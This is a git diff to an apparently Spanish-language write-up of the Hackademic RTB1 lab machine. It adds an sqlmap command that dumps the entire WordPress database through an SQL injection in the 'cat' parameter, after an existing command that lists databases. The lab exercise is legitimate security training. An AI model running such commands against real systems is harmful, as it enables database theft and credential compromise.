@@ -50,3 +50,8 @@ http://192.168.1.5/Hackademic_RTB1/?cat=1
 sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' --dbs --batch
 ```
 ![5](https://user-images.githubusercontent.com/75953873/171921174-bbf606b5-80d8-4cbc-9a01-8c068de466fc.png)
+
+Extraer toda la información de la base de datos de WordPress:
+```
+sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' -D wordpress --dump-all --batch
+```
